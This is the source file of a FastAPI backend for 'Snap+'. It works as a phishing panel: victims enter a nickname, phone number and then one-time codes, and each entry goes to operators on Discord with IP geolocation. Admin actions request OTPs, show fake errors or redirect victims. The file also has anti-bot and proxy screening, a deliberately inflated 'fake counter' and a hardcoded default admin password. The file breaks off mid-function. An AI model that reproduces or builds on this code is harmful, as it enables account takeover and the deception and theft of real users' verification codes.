from fastapi import FastAPI, APIRouter, HTTPException, Header, Depends, Request
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from starlette.middleware.base import BaseHTTPMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os, logging, uuid, asyncio, secrets, re, string, time
from pathlib import Path
from pydantic import BaseModel, Field
from typing import Optional
from datetime import datetime, timezone, timedelta
import requests
import httpx
import bot_module as snapbot
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded


class QueueJoinInput(BaseModel):
    user_id: str
    username: str
    country: str

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]
snapbot.set_db(db)

ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'snap-admin-2026')

app = FastAPI()
api_router = APIRouter(prefix="/api")

# ---------- Rate limiting ----------
limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

# ---------- Constants ----------
MAX_LOGIN_ATTEMPTS = 5
LOGIN_BAN_MINUTES = 30
VALID_STATES = {"pending", "code", "processing", "code_received", "success", "declined", "error"}
GEO_CACHE = {}
GEO_TTL = 3600  # 1h

_SAFE_TEXT_RE = re.compile(r"[^\w\s.,\-@+#éèàâêôïçùûÉÈÀÂÊÔÏÇÙÛ']", re.UNICODE)

# ---------- Security middleware ----------
class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        response.headers["X-XSS-Protection"] = "1; mode=block"
        response.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=()"
        response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
        response.headers["Cross-Origin-Opener-Policy"] = "same-origin"
        if "Server" in response.headers:
            del response.headers["Server"]
        return response

# ---------- Helpers ----------
def now_iso():
    return datetime.now(timezone.utc).isoformat()

def sanitize(s: str, maxlen: int = 200) -> str:
    if not isinstance(s, str):
        return ""
    s = s.strip()[:maxlen]
    # remove HTML/script chars
    s = re.sub(r"[<>`]", "", s)
    return s

def sanitize_strict(s: str, maxlen: int = 60) -> str:
    if not isinstance(s, str):
        return ""
    s = s.strip()[:maxlen]
    return _SAFE_TEXT_RE.sub("", s)

def get_ip(request: Request) -> str:
    xff = request.headers.get("x-forwarded-for") or request.headers.get("X-Forwarded-For")
    if xff:
        return xff.split(",")[0].strip()
    if request.client:
        return request.client.host
    return "0.0.0.0"

async def geolocate(ip: str) -> dict:
    if not ip or ip.startswith(("127.", "10.", "192.168.", "172.")) or ip in ("0.0.0.0", "::1"):
        return {"ip": ip, "country": "Local", "countryCode": "LO", "city": "-", "proxy": False, "hosting": False, "mobile": False}
    cached = GEO_CACHE.get(ip)
    if cached and (time.time() - cached["_t"]) < GEO_TTL:
        return cached
    try:
        loop = asyncio.get_event_loop()
        def fetch():
            return requests.get(
                f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,city,regionName,proxy,hosting,mobile",
                timeout=4,
            ).json()
        data = await loop.run_in_executor(None, fetch)
        if data.get("status") != "success":
            data = {"country": "Unknown", "countryCode": "??", "city": "-", "proxy": False, "hosting": False, "mobile": False}
        data["ip"] = ip
        data["_t"] = time.time()
        GEO_CACHE[ip] = data
        return data
    except Exception:
        return {"ip": ip, "country": "Unknown", "countryCode": "??", "city": "-", "proxy": False, "hosting": False, "mobile": False}

async def get_setting(key: str, default=None):
    doc = await db.settings.find_one({"key": key})
    return doc.get("value") if doc else default

async def set_setting(key: str, value):
    await db.settings.update_one({"key": key}, {"$set": {"value": value}}, upsert=True)

def send_discord(webhook_url: str, payload: dict):
    if not webhook_url:
        return False, "no webhook"
    try:
        r = requests.post(webhook_url, json=payload, timeout=8)
        return (r.status_code in (200, 204)), f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)

async def send_discord_async(webhook_url, payload):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, send_discord, webhook_url, payload)

def build_registration_embed(nickname, phone, geo, invited_by, user_id):
    flag = geo.get("countryCode", "??")
    proxy_warn = "⚠️ PROXY/VPN" if (geo.get("proxy") or geo.get("hosting")) else "✅ Clean"
    return {
        "content": "@everyone 🚨 **NEW SNAP+ REGISTRATION**",
        "username": "Snap+ Bot",
        "allowed_mentions": {"parse": ["everyone"]},
        "embeds": [{
            "title": "🔥 New user just signed up",
            "color": 0xFACC15,
            "thumbnail": {"url": f"https://flagcdn.com/w80/{flag.lower()}.png"} if flag != "??" else None,
            "fields": [
                {"name": "👤 Nickname", "value": f"`{sanitize(nickname, 40)}`", "inline": True},
                {"name": "📞 Phone", "value": f"`{sanitize(phone, 20)}`", "inline": True},
                {"name": "🌍 Location", "value": f"{geo.get('city','-')}, {geo.get('country','?')} ({flag})", "inline": False},
                {"name": "🛡️ Network", "value": proxy_warn, "inline": True},
                {"name": "🎟️ Invited by", "value": f"`{invited_by or '—'}`", "inline": True},
                {"name": "🆔 ID", "value": f"`{user_id}`", "inline": False},
            ],
            "footer": {"text": f"Snap+ · {now_iso()}"},
        }],
    }

def build_code_embed(nickname, phone, code, user_id, geo):
    flag = geo.get("countryCode", "??")
    return {
        "content": "@everyone 🔑 **CODE SUBMITTED**",
        "username": "Snap+ Bot",
        "allowed_mentions": {"parse": ["everyone"]},
        "embeds": [{
            "title": "🎯 OTP code entered",
            "color": 0x22c55e,
            "thumbnail": {"url": f"https://flagcdn.com/w80/{flag.lower()}.png"} if flag != "??" else None,
            "fields": [
                {"name": "👤 User", "value": f"`{sanitize(nickname,40)}` · `{sanitize(phone,20)}`", "inline": False},
                {"name": "🔢 Code", "value": f"```{sanitize(code, 12)}```", "inline": False},
                {"name": "🌍 Location", "value": f"{geo.get('city','-')}, {geo.get('country','?')} ({flag})", "inline": False},
                {"name": "🆔 ID", "value": f"`{user_id}`", "inline": False},
            ],
            "footer": {"text": f"Snap+ · {now_iso()}"},
        }],
    }

async def push_admin_notif(kind: str, data: dict):
    await db.admin_notifs.insert_one({
        "id": str(uuid.uuid4()),
        "kind": kind,
        "data": data,
        "created_at": now_iso(),
    })
    # keep only last 200
    total = await db.admin_notifs.count_documents({})
    if total > 200:
        old = await db.admin_notifs.find({}, {"_id": 1}).sort("created_at", 1).to_list(total - 200)
        if old:
            await db.admin_notifs.delete_many({"_id": {"$in": [d["_id"] for d in old]}})


# ---------- NumVerify (validazione numeri) ----------
NUMVERIFY_API_KEY = os.environ.get("NUMVERIFY_API_KEY", "").strip()
NUMVERIFY_URL = "https://apilayer.net/api/validate"

COUNTRY_DIAL = {"FR": "33", "IT": "39", "DE": "49", "ES": "34", "GB": "44", "BE": "32", "CH": "41", "US": "1"}
COUNTRY_LEN = {"FR": 9, "IT": 10, "DE": 10, "ES": 9, "GB": 10, "BE": 9, "CH": 9, "US": 10}

class NumVerifyService:
    @staticmethod
    def _fallback(phone: str, country: str) -> dict:
        digits = re.sub(r"\D", "", phone or "")
        expected = COUNTRY_LEN.get(country, 10)
        if len(digits) != expected:
            return {"valid": False, "error": f"{expected} cifre richieste per {country}", "source": "local"}
        return {
            "valid": True,
            "number": f"+{COUNTRY_DIAL.get(country, '')}{digits}",
            "carrier": "Unknown",
            "line_type": "mobile",
            "country_code": country,
            "source": "local",
        }

    @staticmethod
    async def validate(phone: str, country: str = "FR") -> dict:
        country = (country or "FR").upper()
        digits = re.sub(r"\D", "", phone or "")
        if not NUMVERIFY_API_KEY:
            return NumVerifyService._fallback(digits, country)
        try:
            async with httpx.AsyncClient(timeout=5.0) as http:
                r = await http.get(NUMVERIFY_URL, params={
                    "access_key": NUMVERIFY_API_KEY,
                    "number": digits,
                    "country_code": country,
                    "format": 1,
                })
            if r.status_code != 200:
                return NumVerifyService._fallback(digits, country)
            data = r.json()
            if data.get("success") is False or "error" in data:
                logging.warning(f"NumVerify error: {data.get('error')}")
                return NumVerifyService._fallback(digits, country)
            if not data.get("valid"):
                return {"valid": False, "error": "Numero non valido", "source": "numverify"}
            intl = data.get("international_format") or f"+{COUNTRY_DIAL.get(country, '')}{digits}"
            return {
                "valid": True,
                "number": intl,
                "carrier": data.get("carrier") or "Unknown",
                "line_type": data.get("line_type") or "mobile",
                "country_code": data.get("country_code") or country,
                "source": "numverify",
            }
        except Exception as e:
            logging.warning(f"NumVerify exception: {e}")
            return NumVerifyService._fallback(digits, country)



# ---------- QUEUE SYSTEM ----------

@api_router.post("/queue/join")
@limiter.limit("10/minute")
async def queue_join(data: QueueJoinInput, request: Request):
    """Utente si unisce a una coda"""
    if data.country not in ["FR", "BE", "BG"]:
        raise HTTPException(400, "Invalid country")
    
    
    # Controlla se già in coda
    existing = await db.queue_entries.find_one({"user_id": data.user_id, "status": "pending"})
    if existing:
        raise HTTPException(400, "Already in queue")
    
    # Conta posizione
    count = await db.queue_entries.count_documents({"country": data.country, "status": "pending"})
    
    entry = {
        "id": str(uuid.uuid4()),
        "user_id": data.user_id,
        "username": data.username,
        "country": data.country,
        "joined_at": now_iso(),
        "position": count + 1,
        "status": "pending"
    }
    
    await db.queue_entries.insert_one(entry)
    return {"ok": True, "position": entry["position"]}

@api_router.post("/queue/leave")
@limiter.limit("10/minute")
async def queue_leave(user_id: str, country: str, request: Request):
    """Utente esce dalla coda"""
    result = await db.queue_entries.delete_one({"user_id": user_id, "country": country, "status": "pending"})
    return {"ok": result.deleted_count > 0}

@api_router.get("/queue/position/{user_id}")
async def queue_position(user_id: str):
    """Posizione in coda"""
    entry = await db.queue_entries.find_one({"user_id": user_id, "status": "pending"})
    if not entry:
        return {"position": None}
    return {"position": entry["position"], "country": entry["country"]}

@api_router.get("/queue/stats/{country}")
async def queue_stats(country: str):
    """Statistiche coda"""
    count = await db.queue_entries.count_documents({"country": country, "status": "pending"})
    return {"people_in_queue": count, "average_wait": f"~{max(1, count * 2)}m"}


# ---------- Auth ----------
async def require_admin(x_admin_token: Optional[str] = Header(None)):
    if not x_admin_token:
        raise HTTPException(401, "Unauthorized")
    sess = await db.admin_sessions.find_one({"token": x_admin_token})
    if not sess:
        raise HTTPException(401, "Unauthorized")
    # attach live permissions
    a = await db.admins.find_one({"username": sess["username"]}, {"_id": 0, "permissions": 1, "role": 1})
    if a:
        sess["permissions"] = a.get("permissions") or {}
        sess["role"] = a.get("role", sess.get("role", "admin"))
    return sess

async def require_owner(sess=Depends(require_admin)):
    if sess.get("role") != "owner":
        raise HTTPException(403, "Owner only")
    return sess

def _has_perm(sess, key):
    if sess.get("role") == "owner":
        return True
    perms = sess.get("permissions") or {}
    return bool(perms.get(key, False))

def require_perm(key: str):
    async def _dep(sess=Depends(require_admin)):
        if not _has_perm(sess, key):
            raise HTTPException(403, f"Missing permission: {key}")
        return sess
    return _dep

# ---------- Models ----------


class RegisterInput(BaseModel):
    nickname: str = Field(min_length=1, max_length=40)
    phone: str = Field(min_length=6, max_length=20)
    country_code: Optional[str] = "FR"
    invite: Optional[str] = None

class PhoneValidationInput(BaseModel):
    phone: str = Field(min_length=3, max_length=20)
    country_code: Optional[str] = "FR"

class SubmitCodeInput(BaseModel):
    code: str = Field(min_length=1, max_length=12)

class AdminLoginInput(BaseModel):
    username: str = Field(min_length=2, max_length=30)
    password: str

class WebhookInput(BaseModel):
    url: str

class StateInput(BaseModel):
    state: str

class BanIPInput(BaseModel):
    ip: str
    reason: Optional[str] = ""

class InviteInput(BaseModel):
    label: Optional[str] = ""

# ---------- Public/Client ----------
@api_router.get("/")
async def root():
    return {"message": "Snap+ API", "ok": True}

@api_router.post("/track/visit")
async def track_visit(request: Request):
    ip = get_ip(request)
    ua = request.headers.get("user-agent", "")[:250]
    # basic bot check
    is_bot = bool(re.search(r"(bot|crawl|spider|scraper)", ua, re.I))
    geo = await geolocate(ip)
    await db.visits.insert_one({
        "id": str(uuid.uuid4()),
        "ip": ip,
        "ua": ua,
        "geo": {k: geo.get(k) for k in ("country", "countryCode", "city", "proxy", "hosting")},
        "is_bot": is_bot,
        "created_at": now_iso(),
    })
    banned = await db.banned_ips.find_one({"ip": ip})
    antibot = await get_setting("antibot_enabled", False)
    is_proxy = bool(geo.get("proxy") or geo.get("hosting"))
    return {
        "banned": bool(banned),
        "proxy": is_proxy if antibot else False,
        "country": geo.get("country"),
        "countryCode": geo.get("countryCode"),
        "city": geo.get("city"),
    }

class ToggleInput(BaseModel):
    enabled: bool

@api_router.get("/admin/antibot")
async def get_antibot(_=Depends(require_owner)):
    v = await get_setting("antibot_enabled", False)
    return {"enabled": bool(v)}

@api_router.put("/admin/antibot")
async def set_antibot(data: ToggleInput, _=Depends(require_owner)):
    await set_setting("antibot_enabled", bool(data.enabled))
    return {"ok": True}

@api_router.post("/validate-phone")
@limiter.limit("30/minute")
async def validate_phone(data: PhoneValidationInput, request: Request):
    """Validazione realtime chiamata dal frontend mentre l'utente digita."""
    return await NumVerifyService.validate(data.phone, data.country_code or "FR")

@api_router.post("/register")
@limiter.limit("10/minute")
async def register(data: RegisterInput, request: Request):
    ip = get_ip(request)
    ua = request.headers.get("user-agent", "")[:250]

    # maintenance guard
    cfg = await snapbot.get_config()
    if cfg.get("maintenance_mode"):
        raise HTTPException(503, "Service temporarily unavailable — maintenance in progress")

    banned = await db.banned_ips.find_one({"ip": ip})
    if banned:
        raise HTTPException(403, "Access denied")

    nickname = sanitize_strict(data.nickname, 40)
    if not nickname:
        raise HTTPException(400, "Invalid nickname")

    phone_clean = "".join(c for c in data.phone if c.isdigit())
    if len(phone_clean) < 6 or len(phone_clean) > 12:
        raise HTTPException(400, "Invalid phone")

    # Validazione NumVerify
    country_code = (data.country_code or "FR").upper()
    check = await NumVerifyService.validate(phone_clean, country_code)
    if not check.get("valid"):
        raise HTTPException(400, check.get("error") or "Invalid phone")
    full_phone = check.get("number") or f"+{COUNTRY_DIAL.get(country_code, '33')}{phone_clean}"
    carrier = check.get("carrier", "Unknown")
    line_type = check.get("line_type", "mobile")

    geo = await geolocate(ip)

    invited_by = None
    invite_code = None
    if data.invite:
        inv = await db.invites.find_one({"code": data.invite.strip()})
        if inv:
            invited_by = inv["owner"]
            invite_code = inv["code"]
            await db.invites.update_one({"code": invite_code}, {"$inc": {"joins": 1}})

    user_id = str(uuid.uuid4())
    doc = {
        "id": user_id,
        "nickname": nickname,
        "phone": full_phone,
        "phone_raw": phone_clean,
        "country_code": country_code,
        "carrier": carrier,
        "line_type": line_type,
        "state": "pending",
        "code_submitted": None,
        "ip": ip,
        "ua": ua,
        "geo": {k: geo.get(k) for k in ("country", "countryCode", "city", "regionName", "proxy", "hosting", "mobile")},
        "invited_by": invited_by,
        "invite_code": invite_code,
        "created_at": now_iso(),
        "updated_at": now_iso(),
    }
    await db.users.insert_one(doc)

    # Notify via Discord bot (replaces old webhook)
    asyncio.create_task(snapbot.notify_new_registration(doc))

    await push_admin_notif("register", {
        "id": user_id, "nickname": nickname, "phone": full_phone,
        "country": geo.get("country"), "countryCode": geo.get("countryCode"),
        "city": geo.get("city"), "invited_by": invited_by,
    })

    return {"id": user_id, "state": "pending"}

@api_router.get("/user/{user_id}/state")
async def get_user_state(user_id: str):
    u = await db.users.find_one({"id": user_id}, {"_id": 0, "state": 1, "nickname": 1, "phone": 1, "error_message": 1, "redirect_url": 1, "decline_reason": 1})
    if not u:
        raise HTTPException(404, "User not found")
    return u

@api_router.post("/user/{user_id}/submit-code")
@limiter.limit("15/minute")
async def submit_code(user_id: str, data: SubmitCodeInput, request: Request):
    ip = get_ip(request)
    cfg = await snapbot.get_config()
    if cfg.get("maintenance_mode"):
        raise HTTPException(503, "Service temporarily unavailable")
    if await db.banned_ips.find_one({"ip": ip}):
        raise HTTPException(403, "Access denied")
    code = sanitize_strict(data.code, 12)
    u = await db.users.find_one({"id": user_id})
    if not u:
        raise HTTPException(404, "User not found")
    # Nuovo stato: l'admin decide via i 3 bottoni nel DM Discord
    await db.users.update_one(
        {"id": user_id},
        {"$set": {"code_submitted": code, "state": "code_received", "error_message": None, "updated_at": now_iso()}},
    )
    updated = await db.users.find_one({"id": user_id})
    asyncio.create_task(snapbot.notify_otp_received(updated, code))
    await push_admin_notif("code", {"id": user_id, "nickname": u["nickname"], "code": code})
    return {"ok": True, "state": "code_received"}

@api_router.get("/live/count")
async def live_count():
    # returns real recent activity for the fake counter (based on last hour)
    total = await db.users.count_documents({})
    return {"total_all_time": total + 321}  # start from 321 baseline

# ---------- Admin auth ----------
@api_router.post("/admin/login")
async def admin_login(data: AdminLoginInput, request: Request):
    ip = get_ip(request)
    now = datetime.now(timezone.utc)

    # rate limit: 5 attempts / 30 min ban
    attempt = await db.login_attempts.find_one({"ip": ip})
    if attempt and attempt.get("banned_until"):
        bu = datetime.fromisoformat(attempt["banned_until"])
        if bu > now:
            raise HTTPException(429, f"Too many attempts. Try again in {int((bu-now).total_seconds()/60)+1} minutes.")

    username = sanitize_strict(data.username, 30).lower()
    if not username:
        raise HTTPException(400, "Invalid username")

    # Determine if there's already an owner
    owner_exists = await db.admins.find_one({"role": "owner"})

    if data.password != ADMIN_PASSWORD:
        # count fail
        count = (attempt.get("fails", 0) if attempt else 0) + 1
        upd = {"$set": {"ip": ip, "fails": count, "last": now.isoformat()}}
        if count >= MAX_LOGIN_ATTEMPTS:
            upd["$set"]["banned_until"] = (now + timedelta(minutes=LOGIN_BAN_MINUTES)).isoformat()
            upd["$set"]["fails"] = 0
            await db.login_attempts.update_one({"ip": ip}, upd, upsert=True)
            raise HTTPException(429, f"Too many failed attempts. Banned for {LOGIN_BAN_MINUTES} min.")
        await db.login_attempts.update_one({"ip": ip}, upd, upsert=True)
        raise HTTPException(401, f"Wrong credentials. {MAX_LOGIN_ATTEMPTS - count} tries left.")

    # IP-username lock
    lock = await db.admin_ip_lock.find_one({"ip": ip})
    if lock:
        if lock["username"] != username:
            count = (attempt.get("fails", 0) if attempt else 0) + 1
            upd = {"$set": {"ip": ip, "fails": count, "last": now.isoformat()}}
            if count >= MAX_LOGIN_ATTEMPTS:
                upd["$set"]["banned_until"] = (now + timedelta(minutes=LOGIN_BAN_MINUTES)).isoformat()
                upd["$set"]["fails"] = 0
            await db.login_attempts.update_one({"ip": ip}, upd, upsert=True)
            raise HTTPException(401, f"This IP is locked to another username. Use '{lock['username']}'.")
    else:
        await db.admin_ip_lock.insert_one({"ip": ip, "username": username, "created_at": now.isoformat()})

    # ensure admin record
    existing = await db.admins.find_one({"username": username})
    if not existing:
        # first admin ever → owner, else pending
        role = "owner" if not owner_exists else "admin"
        status = "approved" if role == "owner" else "pending"
        await db.admins.insert_one({
            "username": username, "role": role, "status": status,
            "created_at": now.isoformat(), "last_login": now.isoformat(),
            "created_from_ip": ip,
        })
        existing = await db.admins.find_one({"username": username})

    if existing.get("status") != "approved":
        raise HTTPException(403, f"Account '{username}' pending owner approval.")

    await db.admins.update_one({"username": username}, {"$set": {"last_login": now.isoformat()}})

    await db.login_attempts.delete_one({"ip": ip})
    token = secrets.token_urlsafe(32)
    await db.admin_sessions.insert_one({
        "token": token, "username": username, "role": existing.get("role", "admin"), "ip": ip, "created_at": now.isoformat()
    })
    return {"token": token, "username": username, "role": existing.get("role", "admin")}

@api_router.post("/admin/logout")
async def admin_logout(sess=Depends(require_admin)):
    await db.admin_sessions.delete_one({"token": sess["token"]})
    return {"ok": True}

@api_router.get("/admin/me")
async def admin_me(sess=Depends(require_admin)):
    return {
        "username": sess["username"],
        "role": sess.get("role", "admin"),
        "ip": sess["ip"],
        "permissions": sess.get("permissions") or {},
    }

class PermissionsInput(BaseModel):
    username: str
    permissions: dict

@api_router.post("/admin/team/permissions")
async def set_permissions(data: PermissionsInput, _=Depends(require_owner)):
    # allowed permission keys (typed values)
    allowed = {
        "view_analytics", "view_invites", "create_invites",
        "view_users", "change_user_state", "delete_users",
        "view_team", "view_security", "view_bot", "edit_bot",
    }
    perms = {k: bool(v) for k, v in (data.permissions or {}).items() if k in allowed}
    await db.admins.update_one({"username": data.username.lower()}, {"$set": {"permissions": perms}})
    return {"ok": True, "permissions": perms}

# ---------- Team management (owner only) ----------
@api_router.get("/admin/team")
async def team_list(_=Depends(require_owner)):
    admins = await db.admins.find({}, {"_id": 0}).sort("created_at", -1).to_list(200)
    return admins

class TeamActionInput(BaseModel):
    username: str

@api_router.post("/admin/team/approve")
async def team_approve(data: TeamActionInput, _=Depends(require_owner)):
    await db.admins.update_one({"username": data.username.lower()}, {"$set": {"status": "approved"}})
    return {"ok": True}

@api_router.post("/admin/team/reject")
async def team_reject(data: TeamActionInput, _=Depends(require_owner)):
    await db.admins.delete_one({"username": data.username.lower(), "role": {"$ne": "owner"}})
    await db.admin_sessions.delete_many({"username": data.username.lower()})
    return {"ok": True}

@api_router.post("/admin/team/promote")
async def team_promote(data: TeamActionInput, _=Depends(require_owner)):
    """Promote an admin to owner role."""
    await db.admins.update_one({"username": data.username.lower()}, {"$set": {"role": "owner"}})
    # update active sessions too
    await db.admin_sessions.update_many({"username": data.username.lower()}, {"$set": {"role": "owner"}})
    return {"ok": True}

@api_router.post("/admin/team/demote")
async def team_demote(data: TeamActionInput, sess=Depends(require_owner)):
    """Demote an owner back to admin. Can't demote yourself if you're the only owner."""
    target = data.username.lower()
    if target == sess["username"]:
        # ensure at least one other owner remains
        other = await db.admins.count_documents({"role": "owner", "username": {"$ne": target}})
        if other == 0:
            raise HTTPException(400, "You are the only owner — promote someone else first")
    await db.admins.update_one({"username": target}, {"$set": {"role": "admin"}})
    await db.admin_sessions.update_many({"username": target}, {"$set": {"role": "admin"}})
    return {"ok": True}

# ---------- Admin users ----------
@api_router.get("/admin/users")
async def list_users(_=Depends(require_admin)):
    users = await db.users.find({}, {"_id": 0}).sort("created_at", -1).to_list(1000)
    return users

@api_router.get("/admin/user/{user_id}")
async def get_user(user_id: str, _=Depends(require_admin)):
    u = await db.users.find_one({"id": user_id}, {"_id": 0})
    if not u:
        raise HTTPException(404, "Not found")
    return u

@api_router.patch("/admin/user/{user_id}/state")
async def change_state(user_id: str, data: StateInput, sess=Depends(require_perm("change_user_state"))):
    if data.state not in VALID_STATES:
        raise HTTPException(400, "Invalid state")
    u = await db.users.find_one({"id": user_id})
    if not u:
        raise HTTPException(404, "Not found")
    await db.users.update_one({"id": user_id}, {"$set": {"state": data.state, "updated_at": now_iso()}})
    await snapbot.log_action(f"🛠 State updated to `{data.state}` for `{u['nickname']}` by admin `{sess['username']}`")
    return {"ok": True, "state": data.state}

class QuickActionInput(BaseModel):
    action: str
    payload: Optional[dict] = None

@api_router.post("/admin/user/{user_id}/action")
async def quick_action(user_id: str, data: QuickActionInput, sess=Depends(require_admin)):
    u = await db.users.find_one({"id": user_id})
    if not u:
        raise HTTPException(404, "Not found")
    a = data.action
    payload = data.payload or {}
    if a == "request_otp":
        await db.users.update_one({"id": user_id}, {"$set": {"state": "code", "updated_at": now_iso()}})
        return {"ok": True, "state": "code"}
    if a == "show_error":
        msg = sanitize(payload.get("message", "Erreur"), 120)
        await db.users.update_one({"id": user_id}, {"$set": {"state": "error", "error_message": msg, "updated_at": now_iso()}})
        return {"ok": True, "state": "error"}
    if a == "redirect_final":
        url = sanitize(payload.get("url", ""), 300)
        await db.users.update_one({"id": user_id}, {"$set": {"state": "success", "redirect_url": url, "updated_at": now_iso()}})
        return {"ok": True, "state": "success"}
    if a == "ban_ip":
        ip = u.get("ip")
        if ip:
            await db.banned_ips.update_one({"ip": ip}, {"$set": {"ip": ip, "reason": f"Banned via user {u['nickname']}", "by": sess["username"], "created_at": now_iso()}}, upsert=True)
        return {"ok": True, "banned_ip": ip}
    raise HTTPException(400, "Unknown action")

@api_router.delete("/admin/user/{user_id}")
async def delete_user(user_id: str, _=Depends(require_perm("delete_users"))):
    res = await db.users.delete_one({"id": user_id})
    return {"deleted": res.deleted_count}

# ---------- Ban IP ----------
@api_router.get("/admin/banned-ips")
async def banned_list(_=Depends(require_owner)):
    ips = await db.banned_ips.find({}, {"_id": 0}).sort("created_at", -1).to_list(500)
    return ips

@api_router.post("/admin/banned-ips")
async def ban_ip(data: BanIPInput, sess=Depends(require_owner)):
    ip = sanitize(data.ip, 50)
    if not ip:
        raise HTTPException(400, "Invalid IP")
    await db.banned_ips.update_one({"ip": ip}, {"$set": {"ip": ip, "reason": sanitize(data.reason or "", 200), "by": sess["username"], "created_at": now_iso()}}, upsert=True)
    return {"ok": True}

@api_router.delete("/admin/banned-ips/{ip}")
async def unban_ip(ip: str, _=Depends(require_owner)):
    await db.banned_ips.delete_one({"ip": ip})
    return {"ok": True}

# ---------- Bot config & control (owner only) ----------
class BotConfigInput(BaseModel):
    token: Optional[str] = None
    notify_channel_id: Optional[str] = None
    logs_channel_id: Optional[str] = None
    leaderboard_channel_id: Optional[str] = None
    leaderboard_title: Optional[str] = None
    leaderboard_desc: Optional[str] = None
    leaderboard_color: Optional[int] = None
    broadcast_channel_id: Optional[str] = None
    broadcast_title: Optional[str] = None
    broadcast_desc: Optional[str] = None
    broadcast_color: Optional[int] = None
    footer_text: Optional[str] = None
    ping_role_ids: Optional[list] = None
    ok_role_id: Optional[str] = None
    embed_color: Optional[int] = None
    embed_title: Optional[str] = None
    embed_desc: Optional[str] = None
    ok_button_label: Optional[str] = None
    ok_button_style: Optional[str] = None
    ok_button_emoji: Optional[str] = None
    otp_button_label: Optional[str] = None
    otp_button_style: Optional[str] = None
    otp_button_emoji: Optional[str] = None

@api_router.get("/admin/bot/config")
async def bot_get_config(_=Depends(require_owner)):
    cfg = await snapbot.get_config()
    # mask token
    if cfg.get("token"):
        t = cfg["token"]
        cfg["token_masked"] = f"{t[:6]}...{t[-4:]}" if len(t) > 10 else "***"
        cfg["token"] = ""
    return cfg

@api_router.put("/admin/bot/config")
async def bot_put_config(data: BotConfigInput, _=Depends(require_owner)):
    patch = {k: v for k, v in data.model_dump().items() if v is not None}
    # sanitize text
    for k in ("embed_title", "embed_desc", "ok_button_label", "otp_button_label", "ok_button_emoji", "otp_button_emoji",
              "leaderboard_title", "leaderboard_desc", "broadcast_title", "broadcast_desc", "footer_text"):
        if k in patch and isinstance(patch[k], str):
            patch[k] = sanitize(patch[k], 500)
    if "ping_role_ids" in patch and isinstance(patch["ping_role_ids"], list):
        patch["ping_role_ids"] = [str(x).strip() for x in patch["ping_role_ids"] if str(x).strip().isdigit()]
    for k in ("notify_channel_id", "logs_channel_id", "ok_role_id", "leaderboard_channel_id", "broadcast_channel_id"):
        if k in patch and patch[k] is not None:
            patch[k] = str(patch[k]).strip()
    if "token" in patch and not patch["token"]:
        patch.pop("token")
    cfg = await snapbot.save_config(patch)
    cfg.pop("token", None)
    return cfg

@api_router.get("/admin/bot/status")
async def bot_status(_=Depends(require_owner)):
    return snapbot.status()

@api_router.post("/admin/bot/start")
async def bot_start(_=Depends(require_owner)):
    ok, msg = await snapbot.start_bot()
    return {"ok": ok, "message": msg, **snapbot.status()}

@api_router.post("/admin/bot/stop")
async def bot_stop(_=Depends(require_owner)):
    await snapbot.stop_bot()
    return {"ok": True, **snapbot.status()}

@api_router.post("/admin/bot/test-notify")
async def bot_test_notify(_=Depends(require_owner)):
    fake = {
        "id": "test-user",
        "nickname": "Test User",
        "phone": "+33612345678",
        "geo": {"city": "Paris", "country": "France"},
        "invited_by": "boss",
    }
    ok, info = await snapbot.notify_new_registration(fake)
    if not ok:
        raise HTTPException(400, f"Failed: {info}")
    return {"ok": True}

@api_router.post("/admin/bot/broadcast")
async def bot_broadcast(_=Depends(require_owner)):
    ok, info = await snapbot.send_broadcast()
    if not ok:
        raise HTTPException(400, f"Failed: {info}")
    return {"ok": True}

@api_router.post("/admin/bot/leaderboard/refresh")
async def bot_leaderboard_refresh(_=Depends(require_owner)):
    ok, info = await snapbot.refresh_leaderboard()
    if not ok:
        raise HTTPException(400, f"Failed: {info}")
    return {"ok": True}

@api_router.get("/admin/bot/leaderboard")
async def bot_leaderboard_data(_=Depends(require_owner)):
    rows = await db.presser_stats.find({}, {"_id": 0}).sort("ok_count", -1).limit(50).to_list(50)
    return rows

# ---------- Maintenance ----------
@api_router.get("/maintenance")
async def get_maintenance_public():
    cfg = await snapbot.get_config()
    return {"enabled": bool(cfg.get("maintenance_mode"))}

class MaintenanceInput(BaseModel):
    enabled: bool

@api_router.post("/admin/maintenance")
async def set_maintenance(data: MaintenanceInput, _=Depends(require_owner)):
    await snapbot.save_config({"maintenance_mode": bool(data.enabled)})
    ok, info = await snapbot.announce_maintenance(bool(data.enabled))
    return {"ok": True, "enabled": bool(data.enabled), "announced": ok, "announce_info": info}

# ---------- Analytics ----------
@api_router.get("/admin/analytics")
async def analytics(_=Depends(require_perm("view_analytics"))):
    visitors = await db.visits.count_documents({})
    registered = await db.users.count_documents({})
    phoned = await db.users.count_documents({"phone": {"$exists": True}})
    otp_submitted = await db.users.count_documents({"code_submitted": {"$ne": None}})
    success = await db.users.count_documents({"state": "success"})

    # last 7 days
    from datetime import timedelta
    days = []
    today = datetime.now(timezone.utc).date()
    for i in range(6, -1, -1):
        d = today - timedelta(days=i)
        d_start = f"{d.isoformat()}T00:00:00"
        d_end = f"{d.isoformat()}T23:59:59"
        v = await db.visits.count_documents({"created_at": {"$gte": d_start, "$lte": d_end + "+00:00"}})
        r = await db.users.count_documents({"created_at": {"$gte": d_start, "$lte": d_end + "+00:00"}})
        days.append({"day": d.strftime("%d/%m"), "visits": v, "regs": r})

    # top countries
    pipeline = [{"$group": {"_id": "$geo.countryCode", "count": {"$sum": 1}}}, {"$sort": {"count": -1}}, {"$limit": 6}]
